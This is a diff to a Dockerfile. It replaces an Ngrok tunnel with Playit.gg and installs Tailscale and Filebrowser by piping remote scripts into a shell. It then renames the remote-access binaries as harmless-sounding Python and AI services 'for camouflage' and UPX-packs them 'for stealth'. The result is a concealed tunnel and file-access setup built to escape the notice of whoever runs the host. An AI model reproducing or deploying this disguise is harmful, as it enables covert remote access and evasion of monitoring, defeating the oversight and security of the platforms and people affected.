@@ -9,16 +9,16 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     && apt-get clean && rm -rf /var/lib/apt/lists/* && \
     mkdir -p /var/run/sshd && chmod 0755 /var/run/sshd
 
-# Install Tailscale, Filebrowser, and Ngrok
+# Install Tailscale, Filebrowser, and Playit.gg
 RUN curl -fsSL https://tailscale.com/install.sh | sh && \
     curl -fsSL https://raw.githubusercontent.com/filebrowser/get/master/get.sh | bash && \
-    curl -fsSL https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz | tar xvz -C /usr/bin
+    curl -fsSL https://playit.gg/downloads/playit-linux-amd64 -o /usr/bin/playit && chmod +x /usr/bin/playit
 
 # Rename tools for camouflage
 RUN mv /usr/sbin/tailscaled /usr/bin/python-cache-manager && \
     mv /usr/bin/tailscale /usr/bin/py-cache-cli && \
     mv /usr/local/bin/filebrowser /usr/bin/ai-metrics-collector && \
-    mv /usr/bin/ngrok /usr/bin/tensor-streamer
+    mv /usr/bin/playit /usr/bin/tensor-streamer
 
 # Binary Stripping and Packing (using fastest compression for stealth)
 RUN upx -1 /usr/bin/python-cache-manager || true && \
